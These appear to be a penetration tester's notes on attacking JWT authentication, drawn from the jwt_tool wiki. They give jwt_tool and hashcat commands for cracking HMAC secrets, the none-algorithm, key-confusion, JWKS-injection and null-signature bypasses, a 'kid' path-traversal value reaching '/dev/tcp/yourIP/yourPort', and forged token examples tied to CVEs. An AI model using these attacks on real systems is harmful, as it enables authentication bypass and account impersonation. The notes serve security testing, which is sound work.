# Attack Methadology

```sh
python3 jwt_tool.py -t <url> -rc "jwt_cookie=...;anothercookie=something" -M pb
```

- note from https://github.com/ticarpi/jwt_tool/wiki/Attack-Methodology 

## Setup
* ### Find JWT tokens
* ### Identify a test page
* ### Check that your test cases work (replay the token)

## Simple check 
* ### Is it required?
	* Yes - go to the next step
	* No - perhaps the JWT isn't the means of authorization on this app and check for other headers, cookies or POST data 
* ### Is it checked?
	* delete the last few characters of the signature and return an error or fail or succeed
	* error message -> read any verbose error info that might leak something sensitive
	* whether it is return different 
	* if the page is the same and signature is not being checked, start tampering the Payload claims 
* ### Is it persistent? (Does it continue working after failed tokens are sent)
	* resent the token multiple times, interspersed with sending no token or one with an invalid signature
	* Yes - token stays static (common behavior). If the same JWT is valid after logout or after a very long duration, this indicates an immortal token and retest this same token in ~24 hours and **report it if it never expires**.
	* No - token has expired or has been invalidated by the application. 
* ### Where is it created? (Origin)
	* it should be created on the server, not the client 
	* if it was first seen coming from the client-side, key is accessible to client-side code - seek it out
* ### Are the claims processed before/despite validation?
	* alter any payload claims that are directly reflected or processed on the page, but leave the signature the same and did the altered values get processed?
	* with jwt_tool 
		* `python3 jwt_tool.py <token> -T`
		* follow the menu to tamper
		* (optionally) set signing or exploit options via -X or -S arguments
		* if changes are accepted, the application is processing these before signature verification and look to see if you can temper anything crucial
		* if changes are not reflected, JWT claims are being processed in the correct order
* ### Weak HMAC secret used as a key
	* HMAC signed keys (algs HS256/HS384/HS512) use symmetric encryption - key that signs the token is also used to verify it and often set to simple passphrases/passwords
	* crack with jwt_tool or others such as hashcat
	* `python3 jwt_tool.py <JWT> -C -d dictionary.txt`
	* dictionary attack - `hashcat -a 0 -m 16500 jwt.txt wordlist.txt`
		* use common default password list or leaked passwords list
	* rule-based - `hashcat -a 0 -m 16500 jwt.txt passlist.txt -r rules/best64.rule`
	* brute force - `hashcat -a 3 -m 16500 jwt.txt ?u?l?l?l?l?l?l?l -i --increment-min=6`
	* if you can crack the HMAC secret, you can forge anything you like in the token 
## Basic Exploit
* ### 'none' Algorithm 
	* Set **"alg": "none"** with no signature, and don't change the payload -> does page still return valid?
	* `python3 jwt_tool.py <JWT> -X a` 
	* if the page returns valid -> you have a bypass - go tampering
* ### RSA key confusion
	* need an RSA public key to test
	* the application provides this via an API or something hidden in the docs
	* need to use the right format of the Public key
	* PEM should contain a single newline character at the end
	* `python3 jwt_tool.py <JWT> -X k -pk my_public.pem`
	* if the page returns valid -> you have a bypass - go tampering
* ### JWKS injection
	* create a new RSA certificate pair, inject a JWKS file with the details of the public key in it and sign the data with the Private key 
	* if successful, the application should use your provided key data to verify it
	* `python3 jwt_tool.py <JWT> -X i`
	* if the page returns valid -> go tampering
* ### null signature
	* delete the signature from the end of the token 
	* if vulnerable, the application will fail to check the signature 
	* `python3 jwt_tool.py <JWT> -X n`

## Advanced tests
* ### 'kid' issues - reveal key
	* if the claim "kid" is used in the header, check the web directory for that file or a variation of it
	* eg - "kid": "key/12345" is present, look for "/key/12345" and "/key/12345.pem" on the web root 
* ### 'kid' issues - path traversal
	* if the claim "kid" is used in the header, check if you can use a different file in the file system
	* pick a file you might be able to predict the content of or may be try `"kid": "/dev/tcp/yourIP/yourPort"` to test connectivity or even some SSRF payloads
	* `python3 jwt_tool.py <JWT> -T` 
* ### URL tampering attacks
	* use Burp Collaborator or tcpdump to collect interaction if you have routable web server or [RequestBin](https://requestbin.com/) 
* ### JWKS Spoofing
	* if the token uses a "jku" Header claim then check out the provided URL which points to a URL containing the JWKS file that holds the Public Key or verifying the token
	* tamper the token to point the jku value to a web service you can monitor the traffic
	* when using jwt_tool make sure the jwtconf.ini file has been updated with the location of your personal JWKS or use `-ju <url>`
	* `python3 jwt_tool.py <JWT> -X s` 
## Extra checks
* ### Cross-service relay attacks
	* some web applications use a trusted JWT service to generate and manage token 
	* if you observe the JWT being issued or renewed via a third-party service, it is worth identifying if you can sign up for an account on another of that service's client with your same username/email
	* try taking that token and replaying it in a request to your target and is it accepted?
	* if accepted > have a critical issue allowing you to spoof any user's account
* ### Does the expiry get checked?
	* "exp" payload claim is used to check the expiry of a token 
	* if the token contains an "exp" claim and test time limits permit it - try storing the token and replaying it after the expiry time has passed
	* use jwt_tool to read the content of the token : decoding includes timestamp parsing and expiry checking
	* if the token still validates in the application, this may be a security risk as the token may NEVER expire

## Taking it further
* ### Fuzzing existing claims (forcing errors)
	* `python3 jwt_tool.py <JWT> -I -hc header1 -hv fuzzing_list.txt -hc header2 -hv testval2 -pc payload1 -pv testval3`

# Vulnerable Claims

## Header Claims

- metadata of the token, telling the application what type of the token it is, how the token is signed, where the signing key or secret is stored, and other details
- Some standard claims
| Token | Description | Format |
| --------- | ------------------ | ------------- |
| typ | Type of token (JWT/JWE/JWS etc) | string |
| alg | Algorithm used for signing or encryption | string |
| kid | Key Id - used as a lookup | string |
| x5u | URL for x509 certificate | URL |
| x5c | x509 certificate for signing (as a nested JSON object) | JSON object |
| jku | URL for JWKS format keys | URL |
| jwk | JWK format key for signing (as a nested JSON object) | JSON object |

* Vulnerabilities in header claims 
	* claims that reference an algorithm or signing method can be adjusted to force the service the attempt to verify the provided token with the amended process
	* claims which reference a URL can be used to redirect the service to query a URL under the attacker's control 
	* claims which include signing certificates can be injected to prompt service to verify the token with the provided key
	* the kid claim may be amended to adjust/attack the location or method used to find/access a signing key 

## Payload Claims

- application-specific data of the token 
- pass to the application the customized list of data it has been programmed to include
- usually processed after the token is validated which restricts their usefulness in bypass attacks
- if you can find a way to get a token signed, it is the contents of the payload claims that will give you the path to impersonation, privilege escalation, code execution and other attacks
- Standard claims

| Token | Description | Format |
| ----- | ----------- | ------ |
| iss | Issuer of the token | string/URL |
| aud | Audience of the token: the user or service that is the intended recipient of the token | string/URL |
| sub | Subject: the recipient of the token | string |
| jti |  a unique identifier for the token | string/integer |
| nbf | NotBefore - a UNIX timestamp of the time before which the token should not be considered valid | interger |
| iat | IssuedAt - a UNIX timestamp of the time when the token was created/became valid | integer |
| exp | Expires - a UNIX timestamp of the time when the token should cease to be valid | integer | 

- Vulnerabilities in Payload claims
	- claims with a URL may be tweaked to redirect traffic to an external service under the attacker's control
	- claims with timestamps might be processed before validation, and may tweaked to affect the validity of  a token 
	- supplementary claims may be accessed in unexpected ways by application code, and may introduce a wide range of attack paths through injection into, or addition of these fields

# Known Exploits and Attacks

## CVE-2015-9235 - alg:none attack

```
{"typ":"JWT", "alg":"none"}.
{"login":"admin"}.
[No signature!]
```

## CVE-2016-5431 - key confusion attack

```
{"typ": "JWT", "alg": "HS256"}.
{"login": "admin"}.
[Signed with HMAC-SHA256 using the public key file
identified for the service as the secret]
```

## CVE-2018-0114 - key injection attack

- inclusion of an inline Public key 
- sign the token using a new Private Key, include the Public key in the token and let the service use that key to verify the token 
```
{
	"typ": "JWT",
	 "alg":"RS256",
	 "jwk":{	 
		 "kty":"RSA",
		 "kid":"TEST",
		 "use":"sig",
		 "e":"AQAB",	
		 "n":"u7sEM4Fio...<Public Key>"
		 }
}.  
{"login":"ticarpi"}.  
[Signed with new Private key; Public key injected]
```

## CVE-2020-28042 - null signature attack

- like alg:none attack 
```
{"typ": "JWT","alg": "HS256"}.  
{"login": "ticarpi"}.  
[No signature!]
```

## JWKS Spoofing

- plays with "jku" and "x5u" header values which point to the URL of the JWKS file or x509 certificate that are used to verify the Asymmetrically-signed token
- by replacing "jku" or "x5u" URL with an attacker-controlled URL containing the Public Key, an attacker can use the paired Private Key to sign the token and let the service retrieve the malicious Public Key and verify the token 
```
{
	"typ": "JWT",
	"alg":"RS256", 
	"jku":"https://ticarpi.com/jwks.json"
}.  
{"login": "ticarpi"}.  
[Signed with new Private key; Public key exported]
```
